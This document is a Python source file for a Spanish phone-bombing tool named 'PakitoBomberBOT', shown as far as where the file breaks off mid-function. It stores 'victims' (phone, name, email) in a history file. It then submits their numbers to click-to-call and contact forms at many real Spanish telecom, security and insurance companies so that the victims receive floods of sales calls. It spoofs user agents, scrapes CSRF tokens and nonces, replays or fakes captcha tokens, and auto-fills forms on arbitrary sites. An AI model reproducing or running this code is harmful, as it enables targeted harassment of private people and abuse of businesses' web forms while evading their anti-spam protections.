from consolemenu import *
from consolemenu.items import *
import signal
import sys
import warnings
warnings.filterwarnings("ignore")
import time
import os
import argparse
from unidecode import unidecode
import re
from os import system
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin
from colorama import Fore, Style, init
import random # Imported for random delays
import json # Imported for history persistence


init()

version = '2.5 FAST'
global debug

parser = argparse.ArgumentParser()
parser.add_argument('--debug', action='store_true', help="Habilitar el modo debug")
parser.add_argument('--start', nargs=4, metavar=('nombre', 'apellido', 'telefono', 'email'),
                    help="Iniciar el programa con datos: nombre apellido telefono email") # Keep args.start for backward compatibility/single target auto mode

args = parser.parse_args()
debug = int(args.debug)

if os.name == 'nt':
    system("title " 'PakitoBomberBOT v'+version)
else:
    system("echo -e '\033]2;PakitoBomberBOT v"+version+"\007'")

global pakito_header
pakito_header = Fore.GREEN + Style.BRIGHT + r"""
  ___  _   _  _ ___ _____ ___
 | _ \/_\ | |/ |_ _|_   _/ _ \
 |  _/ _ \| ' < | |  | || (_) |
 |_|/_/ \_\_|\_\___| |_| \___/
  ___  ___  __  __ ___ ___ ___
 | _ )/ _ \|  \/  | _ ) __| _ \
 | _ \ (_) | |\/| | _ \ _||   /
 |___/\___/|_|  |_|___/___|_|_\

             B O T (FAST MODE)
""" + Style.RESET_ALL

# --- UTILS ---
def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def validacion_no_vacia(input_str):
    return input_str.strip() != ''

def pregunta_estilizada(prompt, datos_previos='', email='', validacion=None):
    clear_console()
    print(pakito_header)
    if datos_previos:
        print(datos_previos)
    while True:
        try:
            respuesta = input(Fore.GREEN + Style.BRIGHT + prompt + Style.RESET_ALL)
            if not validacion or validacion(respuesta):
                break
            else:
                print(Fore.RED + "Entrada inválida." + Style.RESET_ALL)
        except EOFError:
            exit(0)
    if email:
        datos_previos += Fore.WHITE + Style.BRIGHT + f"Correo: {email}\n" + Style.RESET_ALL
    return respuesta

def get_random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
    ]
    return random.choice(user_agents)

def load_history():
    try:
        if os.path.exists('victims.json'):
            with open('victims.json', 'r', encoding='utf-8') as f:
                return json.load(f)
        return []
    except Exception:
        return []

def save_history(new_victim):
    history = load_history()
    # Check if number already exists to update or append
    updated = False
    for i, victim in enumerate(history):
        if victim['number'] == new_victim['number']:
            history[i] = new_victim
            updated = True
            break
    if not updated:
        history.append(new_victim)
    
    with open('victims.json', 'w', encoding='utf-8') as f:
        json.dump(history, f, indent=4, ensure_ascii=False)

def formulario():
    victims = []
    
    if debug == 1:
        print(pakito_header)
        print('MODO DEBUG ACTIVADO')
        victims.append({'number': '666666666', 'name': 'NombrePrueba', 'surname': 'ApellidoPrueba', 'email': 'CorreoPrueba@gmail.com'})
        victims.append({'number': '666666667', 'name': 'NombrePruebaDos', 'surname': 'ApellidoPruebaDos', 'email': 'CorreoPruebaDos@gmail.com'})
        return victims

    def normalizar_cadena(cadena):
        cadena = unidecode(cadena)
        cadena = re.sub(r'[^a-zA-Z0-9]', '', cadena)
        return cadena

    prefijos = ('6', '7', '9')
    def validacion_telefono(num_str):
        return len(num_str) == 9 and num_str.isdigit() and num_str[0] in prefijos

    # History Selection Menu
    history = load_history()
    if history:
        while True:
            clear_console()
            print(pakito_header)
            print(Fore.GREEN + "--- HISTORIAL DE VÍCTIMAS ---" + Style.RESET_ALL)
            for idx, v in enumerate(history):
                print(f"[{idx+1}] {v['name']} {v['surname']} ({v['number']})")
            
            print(Fore.GREEN + "-----------------------------" + Style.RESET_ALL)
            print("[N] NUEVA VÍCTIMA (Manual)")
            print("[A] ATACAR A TODOS (Historial completo)")
            print("[S] SELECCIONAR VARIOS (ej: 1,3)")
            print("[0] CONTINUAR (Si ya seleccionaste)")
            
            opcion = input(Fore.CYAN + "Seleccione una opción: " + Style.RESET_ALL).upper()
            
            if opcion == 'N':
                break # Break to go to manual input loop
            elif opcion == 'A':
                return history
            elif opcion == 'S':
                 # Select specific indices
                 indices_str = input(Fore.CYAN + "Introduce los números separados por coma (ej: 1,3): " + Style.RESET_ALL)
                 try:
                     indices = [int(x.strip()) - 1 for x in indices_str.split(',')]
                     selected = []
                     for i in indices:
                         if 0 <= i < len(history):
                             selected.append(history[i])
                     if selected:
                         return selected
                 except:
                     print(Fore.RED + "Selección inválida." + Style.RESET_ALL)
                     time.sleep(1)
            elif opcion.isdigit() and 1 <= int(opcion) <= len(history):
                # Single selection
                return [history[int(opcion)-1]]
            else:
                 break # If 0 or invalid, assume we want manual or exit history menu

    # Manual Input Loop
    print(Fore.YELLOW + "Introduce cuántas víctimas NUEVAS quieres añadir (ej: 1, 2...):" + Style.RESET_ALL)
    num_victims_str = pregunta_estilizada('[+] NÚMERO DE VÍCTIMAS: ', validacion=lambda x: x.isdigit() and int(x) > 0)
    num_victims = int(num_victims_str)

    for i in range(num_victims):
        clear_console()
        print(pakito_header)
        print(Fore.GREEN + f"--- DATOS DE LA VÍCTIMA {i + 1} DE {num_victims} ---" + Style.RESET_ALL)
        
        datos_persona = ''
        number = pregunta_estilizada('[+] TELÉFONO OBJETIVO: ', datos_persona, validacion=validacion_telefono)
        datos_persona += Fore.WHITE + Style.BRIGHT + f"Móvil: {number}\n" + Style.RESET_ALL

        name = pregunta_estilizada('[+] NOMBRE: ', datos_persona, validacion=validacion_no_vacia)
        datos_persona += Fore.WHITE + Style.BRIGHT + f"Nombre: {name}\n" + Style.RESET_ALL

        surname = pregunta_estilizada('[+] APELLIDO: ', datos_persona, validacion=validacion_no_vacia)
        nombre_completo = Fore.WHITE + Style.BRIGHT + f"Apellido: {surname}\n" + Style.RESET_ALL
        datos_persona += nombre_completo

        name_normalized = normalizar_cadena(name.lower())
        surname_normalized = normalizar_cadena(surname.lower())

        email = pregunta_estilizada('[+] EMAIL OBJETIVO (Dejar en blanco para auto-generar): ', datos_persona)
        if not email:
            email = f'{name_normalized}.{surname_normalized}@gmail.com'
        
        new_victim = {
            'number': number,
            'name': name,
            'surname': surname,
            'email': email
        }
        
        victims.append(new_victim)
        save_history(new_victim) # Save automatically
        
        print(Fore.GREEN + f"Víctima {i+1} registrada y guardada." + Style.RESET_ALL)
        time.sleep(1)

    clear_console()
    print(pakito_header)
    print(Fore.GREEN + f"Se han cargado {len(victims)} víctimas para el ataque." + Style.RESET_ALL)
    return victims

interrupted = False
def handle_interrupt(sig, frame):
    global interrupted
    interrupted = True
    print("\nDeteniendo ataque... Espere a que finalicen los hilos activos.")

# --- ATTACK MODULES ---

class SmartFormAttacker:
    """Intenta descubrir y enviar formularios automáticamente sin Selenium"""
    def __init__(self, target_url, name, surname, number, email):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': get_random_user_agent()})
        self.name = name
        self.surname = surname
        self.number = number
        self.email = email

    def find_forms(self, html):
        # Regex simple para encontrar formularios (sin BS4)
        form_pattern = re.compile(r'<form(.*?)>(.*?)</form>', re.DOTALL | re.IGNORECASE)
        return form_pattern.findall(html)

    def parse_inputs(self, form_html):
        inputs = {}
        # Input tags
        input_pattern = re.compile(r'<input[^>]*name=["\'](.*?)["\'][^>]*>', re.IGNORECASE)
        for match in input_pattern.finditer(form_html):
            name_attr = match.group(1)
            # Intentar deducir el valor
            val = ''
            lower_name = name_attr.lower()
            if any(x in lower_name for x in ['tel', 'phone', 'movil', 'celular']):
                val = self.number
            elif any(x in lower_name for x in ['mail', 'correo']):
                val = self.email
            elif any(x in lower_name for x in ['surname', 'apellido']):
                val = self.surname
            elif any(x in lower_name for x in ['name', 'nombre']):
                val = self.name
            elif 'check' in lower_name or 'condiciones' in lower_name or 'priva' in lower_name:
                val = '1' # Checkboxes a menudo son 1, true, o on.
            
            # Buscar value predefinido
            val_match = re.search(r'value=["\'](.*?)["\']', match.group(0))
            if val_match and not val:
                val = val_match.group(1)
            
            inputs[name_attr] = val
            
        # Select options (simple)
        select_pattern = re.compile(r'<select[^>]*name=["\'](.*?)["\'][^>]*>', re.IGNORECASE)
        for match in select_pattern.finditer(form_html):
             # Asumimos el primer valor, difícil sin parsear todo el select
             inputs[match.group(1)] = "" 

        return inputs

    def extract_action(self, form_tag_content):
        match = re.search(r'action=["\'](.*?)["\']', form_tag_content, re.IGNORECASE)
        if match:
            return match.group(1)
        return ""

    def run(self):
        try:
            # 1. Obtener la paǵina
            resp = self.session.get(self.target_url, timeout=10)
            if resp.status_code != 200:
                print(Fore.RED + f"{self.target_url}: Error HTTP {resp.status_code}" + Style.RESET_ALL)
                return

            forms = self.find_forms(resp.text)
            if not forms:
                print(Fore.YELLOW + f"{self.target_url}: No se encontraron formularios legibles" + Style.RESET_ALL)
                return

            # Intentar el primer formulario que parezca de contacto
            for tags, content in forms:
                if 'search' in tags.lower(): continue # Saltar buscadores
                
                action = self.extract_action(tags)
                target_endpoint = urljoin(self.target_url, action) if action else self.target_url
                
                data = self.parse_inputs(content)
                
                # Si no hemos encontrado el input de telefono, probablemente no es el form correcto
                has_phone = any(v == self.number for v in data.values())
                if not has_phone:
                    continue

                # Enviar
                post_resp = self.session.post(target_endpoint, data=data, timeout=10)
                
                # Análisis de respuesta más detallado
                success_keywords = ['gracias', 'thank', 'recibido', 'confirm', 'success', 'ok', 'correct', 'enviado']
                failure_keywords = ['captcha', 'robot', 'spam', 'error', 'bloqueado', 'denied', 'forbidden', 'incorrect', 'fallo']
                response_text_lower = post_resp.text.lower()
                
                is_success_code = post_resp.status_code in [200, 201, 302]
                keyword_found = any(k in response_text_lower for k in success_keywords)
                failure_found = any(k in response_text_lower for k in failure_keywords)

                if is_success_code and not failure_found:
                    if keyword_found or post_resp.status_code == 302:
                        print(Fore.GREEN + f"AUTO-ATTACK {self.target_url}: ÉXITO (Solicitud Enviada)" + Style.RESET_ALL)
                    else:
                        print(Fore.YELLOW + f"AUTO-ATTACK {self.target_url}: ENVIADO (Sin confirmación explícita)" + Style.RESET_ALL)
                    return
                else:
                    msg = f"Código {post_resp.status_code}"
                    if failure_found:
                        msg += " - Detectado bloqueo/error"
                    print(Fore.RED + f"AUTO-ATTACK {self.target_url}: FALLÓ ({msg})" + Style.RESET_ALL)
                    return

            print(Fore.YELLOW + f"{self.target_url}: No se pudo identificar el formulario correcto" + Style.RESET_ALL)

        except Exception as e:
            print(Fore.RED + f"{self.target_url}: Error de Conexión/Timeout" + Style.RESET_ALL)


# --- SPECIFIC SERVICES ---

def attack_securitas_direct(number, name):
    try:
        url = "https://alarmas.securitasdirect.es/mail/send/espana/altitude2"
        payload = {
            "Telefono1": number,
            "sddestino": "infocomercial@securitasdirect.es",
            "sdurlfinal": "https://www.securitasdirect.es/lp/seo/c2c.php",
            "sdurlfalta": "https://www.securitasdirect.es/error-envio",
            "sdobligatorios": "Nombre,Telefono1",
            "sdasunto": "seo",
            "sdOrigen": "seo",
            "sdIdPais": "1",
            "Apellido1": "no data",
            "sdemail": "no@no.es",
            "Nombre": name,
            "acepto_politica": "on"
        }
        res = requests.post(url, data=payload, timeout=5)
        if res.status_code == 200:
            print(Fore.GREEN + "Securitas Direct: Enviado (API)" + Style.RESET_ALL)
        else:
            print(Fore.YELLOW + f"Securitas Direct: Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Securitas Direct: Error {e}" + Style.RESET_ALL)

def attack_isalud_api(number, name, surname, email):
    try:
        payload = {'name': name, 'surname': surname, 'email': email, 'number': number}
        requests.post('https://vsec.es/llamada.php', data=payload, timeout=5)
        print(Fore.GREEN + 'iSalud (VSEC): Enviado' + Style.RESET_ALL)
    except Exception as e:
        pass # Silent

def attack_recordador(number):
    try:
        payload = {'phoneNumber': '34'+number}
        headers = {
            "User-Agent": get_random_user_agent(),
        }
        requests.post('https://connect.pabbly.com/workflow/sendwebhookdata/IjU3NjUwNTY5MDYzNTA0M2M1MjZmNTUzNTUxMzci_pc', headers=headers, data=payload, timeout=5)
        print(Fore.GREEN + 'Recordador: Enviado' + Style.RESET_ALL)
    except Exception as e:
        pass

def attack_euskaltel(number):
    try:
        url = "https://grupomasmovil.inconcertcc.com/public/integration/process"
        headers = {
            "User-Agent": get_random_user_agent(),
            "Content-Type": "application/json",
            "Referer": "https://www.euskaltel.com/",
            "Origin": "https://www.euskaltel.com",
            "x-brand": "EUSKALTEL",
            "x-locale": "es-ES"
        }
        payload = {
          "serviceAction": "c2c",
          "serviceSourceId": "wfVyjx1480EU",
          "contactData": {
            "language": "es",
            "phone": number,
            "ad_user_data": 0,
            "ad_personalization": 0
          }
        }
        # Requests automatically handles json serialization with the json parameter
        res = requests.post(url, json=payload, headers=headers, timeout=5)
        
        if res.status_code == 200:
             print(Fore.GREEN + "Euskaltel (MasMovil): Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"Euskaltel (MasMovil): Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         # Using generic error print like others, or pass
         print(Fore.RED + f"Euskaltel (MasMovil): Error {e}" + Style.RESET_ALL)

def attack_masmovil_byside(number):
    try:
        url = "https://bywe1.byside.com/BWAC9857E6B19/rpc/request.php"
        headers = {
            "User-Agent": get_random_user_agent(),
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://www.masmovil.es/",
            "Origin": "https://www.masmovil.es",
            "Authority": "bywe1.byside.com"
        }
        
        # Payload raw reconstructed to dictionary or string. String used to be precise with encoded arrays.
        # Key param is a[a][p] for phone.
        data_payload = {
            "a[e][i][w]": "C9857E6B19",
            "a[e][i][c]": "masmovil_residencial",
            "a[e][i][f]": "",
            "a[e][i][t]": "DO_NOT_TRACK_0",
            "a[e][i][s]": "z9ycj0pijvutrmoaujn9c7hm44tspztoo5odb9bdxckr4npvar",
            "a[e][pu]": "0h2pd84plnwv4yjaplnmlefq9759jj6d4t4sc73peln4fbjujx",
            "a[e][r]": "",
            "a[e][pg]": "https://www.masmovil.es/",
            "a[e][t]": "MASMOVIL: Telefonía móvil e Internet | WEB OFICIAL®️",
            "a[e][br]": "507x864",
            "a[e][re]": "1440x900",
            "a[e][l]": "es",
            "a[e][v]": "v20250407a",
            "a[e][qs]": "",
            "a[m]": "contact",
            "a[p]": "requestClick2Call",
            "a[a][p]": "34" + number,
            "a[a][f][mm_external_campaign_900]": "900696000",
            "a[a][f][mm_external_utm_id]": "utm_id=wfVyjx1412MM",
            "a[a][f][gdpr]": "SI",
            "a[a][f][gdpr_origen]": "",
            "a[a][s]": "_1766224800",
            "a[a][w]": "37130",
            "a[a][r]": "w149288:25622",
            "a[a][b]": "28137",
            "a[a][o]": "0",
            "a[c]": "1",
            "rndc": "1766210443233"
        }

        res = requests.post(url, data=data_payload, headers=headers, timeout=5)
        
        if res.status_code == 200:
             print(Fore.GREEN + "MasMovil (BySide): Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"MasMovil (BySide): Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"MasMovil (BySide): Error {e}" + Style.RESET_ALL)

def attack_guuk_byside(number):
    try:
        url = "https://bywe2.byside.com/BWA3CEBF2BABE/rpc/request.php"
        headers = {
            "User-Agent": get_random_user_agent(),
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://guuk.com/",
            "Origin": "https://guuk.com",
            "Authority": "bywe2.byside.com"
        }
        
        data_payload = {
            "a[e][i][w]": "3CEBF2BABE",
            "a[e][i][c]": "",
            "a[e][i][f]": "",
            "a[e][i][t]": "DO_NOT_TRACK_0",
            "a[e][i][s]": "3vgvql4id6ke4j8e4h1tb91daw08u9g0rfnu307kiq6j1j1cjw",
            "a[e][pu]": "k47xswcuvwl6amd79berm77vn7r4p2f72fs02az97s42dqjqgu",
            "a[e][r]": "",
            "a[e][pg]": "https://guuk.com/",
            "a[e][t]": "Operador de telefonía móvil y fibra | Guuk",
            "a[e][br]": "507x861",
            "a[e][re]": "1440x900",
            "a[e][l]": "es",
            "a[e][v]": "v20250407a",
            "a[e][qs]": "",
            "a[m]": "contact",
            "a[p]": "requestClick2Call",
            "a[a][p]": "34" + number,
            "a[a][f][mm_external_campaign_900]": "900622151",
            "a[a][f][gdpr]": "SI",
            "a[a][f][gdpr_origen]": "C2C",
            "a[a][f][mm_external_utm_id]": "utm_id=wfVyjx1346GK",
            "a[a][s]": "_1766228400",
            "a[a][w]": "2383",
            "a[a][r]": "w3489:1033",
            "a[a][b]": "851",
            "a[a][o]": "0",
            "a[c]": "1",
            "rndc": "1766210553546"
        }

        res = requests.post(url, data=data_payload, headers=headers, timeout=5)
        
        if res.status_code == 200:
             print(Fore.GREEN + "Guuk (BySide): Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"Guuk (BySide): Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"Guuk (BySide): Error {e}" + Style.RESET_ALL)

def attack_telecable(number):
    try:
        url = "https://grupomasmovil.inconcertcc.com/public/integration/process"
        headers = {
            "User-Agent": get_random_user_agent(),
            "Content-Type": "application/json",
            "Referer": "https://telecable.es/",
            "Origin": "https://telecable.es",
            "x-brand": "TELECABLE",
            "x-locale": "es-ES"
        }
        payload = {
          "serviceAction": "c2c",
          "serviceSourceId": "wfVyjx1444T",
          "contactData": {
            "language": "es",
            "phone": number,
            "ad_user_data": 0,
            "ad_personalization": 0
          }
        }
        res = requests.post(url, json=payload, headers=headers, timeout=5)
        
        if res.status_code == 200:
             print(Fore.GREEN + "Telecable: Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"Telecable: Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"Telecable: Error {e}" + Style.RESET_ALL)

def attack_mundo_r(number):
    try:
        url = "https://grupomasmovil.inconcertcc.com/public/integration/process"
        headers = {
            "User-Agent": get_random_user_agent(),
            "Content-Type": "application/json",
            "Referer": "https://mundo-r.com/",
            "Origin": "https://mundo-r.com",
            "x-brand": "R",
            "x-locale": "es-ES"
        }
        payload = {
          "serviceAction": "c2c",
          "serviceSourceId": "wfVyjx1450R",
          "contactData": {
            "language": "es",
            "phone": number,
            "ad_user_data": 0,
            "ad_personalization": 0
          }
        }
        res = requests.post(url, json=payload, headers=headers, timeout=5)
        
        if res.status_code == 200:
             print(Fore.GREEN + "Mundo-R: Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"Mundo-R: Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"Mundo-R: Error {e}" + Style.RESET_ALL)

def attack_hits_mobile(number):
    try:
        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36"
        })
        
        # Step 1: Get the page to fetch cookies and hidden fields
        # Note: Hits Mobile might use complex JS challenges (Incapsula). 
        # A simple request might not work if they are strict, but this is the best 'fast' attempt.
        resp = session.get("https://www.hitsmobile.es/es/contact", timeout=10)
        
        # Step 2: Extract all hidden inputs from the form
        inputs = {}
        # Find inputs
        input_pattern = re.compile(r'<input[^>]*name=["\'](.*?)["\'][^>]*value=["\'](.*?)["\']', re.IGNORECASE)
        for match in input_pattern.finditer(resp.text):
            inputs[match.group(1)] = match.group(2)
            
        # Add our target fields
        inputs['telefono'] = number
        inputs['email'] = ""
        inputs['ya_cliente'] = "N"
        inputs['origin'] = "solicita-llamada" # Force this if not extracted
        
        # Step 3: POST
        url_post = "https://www.hitsmobile.es/es/contact-action"
        res = session.post(url_post, data=inputs, timeout=10)
        
        if res.status_code == 200 or res.status_code == 302:
             print(Fore.GREEN + "Hits Mobile: Enviado (Dynamic)" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"Hits Mobile: Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"Hits Mobile: Error {e}" + Style.RESET_ALL)

def attack_excom(number):
    try:
        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36"
        })
        
        # Step 1: GET to get the token
        resp = session.get("https://www.excom.es/", timeout=10)
        
        # Step 2: Extract CSRF Token
        # Pattern for: name="callme_nav[_token]" value="..."
        token_match = re.search(r'name="callme_nav\[_token\]"\s+value="([^"]+)"', resp.text)
        token = token_match.group(1) if token_match else ""
        
        if not token:
            print(Fore.YELLOW + "Excom: No se pudo extraer token" + Style.RESET_ALL)
            return

        # Step 3: Multipart POST
        url_post = "https://www.excom.es/callme-generate"
        
        # Multipart dictionary
        files = {
            'callme_nav[isClient]': (None, 'contratar'),
            'callme_nav[name]': (None, 'Usuario'),
            'callme_nav[phone]': (None, '+34' + number),
            'callme_nav[motive]': (None, ''),
            'callme_nav[postalCode]': (None, ''),
            'callme_nav[apellido]': (None, ''),
            'callme_nav[direccion]': (None, ''),
            'callme_nav[accept]': (None, '1'),
            'callme_nav[captcha]': (None, 'NO_CAPTCHA_SOLVER'), # Likely to fail if strict
            'callme_nav[_token]': (None, token)
        }
        
        res = session.post(url_post, files=files, timeout=10)
        
        if res.status_code == 200:
             print(Fore.GREEN + "Excom: Enviado (Dynamic)" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"Excom: Falló ({res.status_code})" + Style.RESET_ALL)

    except Exception as e:
         print(Fore.RED + f"Excom: Error {e}" + Style.RESET_ALL)

def attack_adamo(number):
    try:
        session = requests.Session()
        session.headers.update({
            "User-Agent": get_random_user_agent(),
            "Referer": "https://adamo.es/",
            "Origin": "https://adamo.es",
            "Content-Type": "application/json"
        })
        
        # Step 1: Init session
        session.get("https://adamo.es/", timeout=10)
        
        # Step 2: POST
        url = "https://adamo.es/api/sendCallRequest/"
        payload = {"phone": number, "utm": None}
        
        res = session.post(url, json=payload, timeout=10)
        
        if res.status_code == 200:
             print(Fore.GREEN + "Adamo: Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"Adamo: Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"Adamo: Error {e}" + Style.RESET_ALL)

def attack_embou(number):
    try:
        session = requests.Session()
        session.headers.update({
            "User-Agent": get_random_user_agent(),
            "Referer": "https://www.embou.com/",
            "Origin": "https://www.embou.com",
            "app-id": "EMBOU_APP",
            "public-key": "123456789",
            "x-requested-with": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        })
        
        # Step 1: Init session
        session.get("https://www.embou.com/", timeout=10)

        # Step 2: POST
        url = "https://www.embou.com/ajax/modal/telephone/call-request"
        
        # Hardcoded payload based on request 
        data = {
            "chkSoyCliente": "0",
            "txtName": "Usuario",
            "txtTel": number,
            "txtTown": "Madrid",
            "txtDni": "",
            "chkAcceptPp": "1",
            "txtTokenRecaptcha": "NO_SOLVER_BEST_EFFORT" 
        }
        
        res = session.post(url, data=data, timeout=10)
        
        if res.status_code == 200:
             print(Fore.GREEN + "Embou: Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"Embou: Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"Embou: Error {e}" + Style.RESET_ALL)

def attack_avatel(number):
    try:
        session = requests.Session()
        session.headers.update({
            "User-Agent": get_random_user_agent(),
            "Referer": "https://avatel.es/",
            "Origin": "https://avatel.es",
            "Content-Type": "application/json"
        })
        
        # Step 1: Init session and get Nonce
        resp = session.get("https://avatel.es/", timeout=10)
        
        # Extract WP Nonce (common patterns: "nonce":"...", "X-WP-Nonce":"...")
        # Pattern usually found in localization vars like var aura_avatel_params = {"nonce":"..."}
        nonce = ""
        nonce_match = re.search(r'["\']nonce["\']\s*:\s*["\']([^"\']+)["\']', resp.text)
        if nonce_match:
            nonce = nonce_match.group(1)
            
        if not nonce:
             # Try fallback to specific header extraction if exposed in metas (unlikely but possible)
             pass
        
        # Step 2: POST
        url = "https://avatel.es/wp-json/aura-avatel/v1/te-llamamos"
        
        if nonce:
            session.headers.update({"X-WP-Nonce": nonce})
            
        payload = {
            "type": "particular",
            "postalCode": "",
            "telefono": "+34-" + number[:3] + " " + number[3:5] + " " + number[5:7] + " " + number[7:], # Format +34-XXX XX XX XX
            "tipo_consulta": {"value": 0, "name": "No soy cliente"},
            "politica_privacidad": "true",
            "url": "https://avatel.es/",
            "origen": "web"
        }
        
        # Add a fake recaptcha token header just in case it passes with a garbage one
        session.headers.update({"x-recaptcha-token": "NO_SOLVER_BEST_EFFORT"})

        res = session.post(url, json=payload, timeout=10)
        
        if res.status_code == 200:
             print(Fore.GREEN + "Avatel: Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"Avatel: Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"Avatel: Error {e}" + Style.RESET_ALL)

def attack_youmobile(number):
    try:
        url = "https://www.youmobile.es/wp-json/contact-form-7/v1/contact-forms/3995/feedback"
        
        # Multipart dictionary
        files = {
            '_wpcf7': (None, '3995'),
            '_wpcf7_version': (None, '5.0.1'),
            '_wpcf7_locale': (None, 'es_ES'),
            '_wpcf7_unit_tag': (None, 'wpcf7-f3995-o1'),
            '_wpcf7_container_post': (None, '0'),
            'tel-165': (None, number)
        }
        
        headers = {
            "User-Agent": get_random_user_agent(),
            "Referer": "https://www.youmobile.es/",
            "Origin": "https://www.youmobile.es"
        }
        
        res = requests.post(url, files=files, headers=headers, timeout=10)
        
        if res.status_code == 200:
             print(Fore.GREEN + "YouMobile: Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"YouMobile: Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"YouMobile: Error {e}" + Style.RESET_ALL)

def attack_isalud_fiatc(number, name, email):
    try:
        url = "https://fiatc.isalud.com/llama-gratis"
        headers = {
            "User-Agent": get_random_user_agent(),
            "Referer": "https://fiatc.isalud.com/llama-gratis",
            "Origin": "https://fiatc.isalud.com",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        # Payload matching the dump with duplicates and 34 prefix
        # Dump: name=...&phone=34...&email=...&acceptAll=&acceptAll=1...
        payload = [
            ('name', name),
            ('phone', '34' + number),
            ('email', email),
            ('acceptAll', ''),
            ('acceptAll', '1'),
            ('acceptpolicy', ''),
            ('acceptpolicy', '1'),
            ('acceptpolicy2', ''),
            ('acceptpolicy2', '1'),
            ('recaptcha_response', '0cAFcWeA4gEt4l_wvCCF1lBXZpxHN3-TGfosS5-COeq-BJcOvyAtk3YedLRoz7382d77sHUOxWLJstZTKY-8KtbSvxyU1veJNJuOwAOgsshsT4jfbcgzkiypvPirjkFZODC1neN0vl5IaP0hUvhaGJ6gZPP_udadyuUwybi_mWN-KGb3SeAEaGgvFtwOh-YUlEy489u2R6lFtYacr2tB_rHoL0Cr7xhD2DGp7v5GyYtqn0RvOY1LgpTWzq5l0WQyocRkRQM4zVRW8zFRvN3n1cuUmZnVVNRHYKOxJ3BUshoeCuXH1KaWN6onHuF2heHfEXCawM9T7FGk-74v3sMR44juQ69_hG77YrY2DijWVB1OebZ3P9bWNjUSIXIl-HIEcv8GBFEbJjbdXkLUTA-uz4NY24z_YM0dgDHTCn5W9R8q_MH9eo-bgCcrJnmi_BidYkX9MSXuY5mDcwPJy_ZM-axNpFQ9_zVRAxWN8NhMDL7Z5zHpl3o38tULtBthLrhpXbjcZv3kuQjF6appVcj_H5YXm083Bc3vMnEFN-Vj7YPoF1iGFKO4yIk-A0GdBO5Pfol8uirHBNq90tvwes9ztoobDcL6OAdEN3Tx5sUAt4-mB-IjgVBH7keP2BGtmySV7mronwSNmr9H5MQvDs3sqjPqe2vbWL0PAkn3-zKbC3zb9mMlTQ60ikiZESrjBYJZ_SDiP0PL102D8yjNM8A3-oSrv-S_prBTwwbJIOWbch1F6TD5pXti4_PeUnfBO-naOtzqJKWcR5bsKe') 
        ]
        
        res = requests.post(url, data=payload, headers=headers, timeout=10)
        
        if res.status_code == 200 or res.status_code == 302:
             print(Fore.GREEN + "FIATC: Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"FIATC: Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"FIATC: Error {e}" + Style.RESET_ALL)

def attack_integra_energia(number, name):
    try:
        session = requests.Session()
        session.headers.update({
            "User-Agent": get_random_user_agent(),
            "Referer": "https://www.integraenergia.es/contrata-ahora",
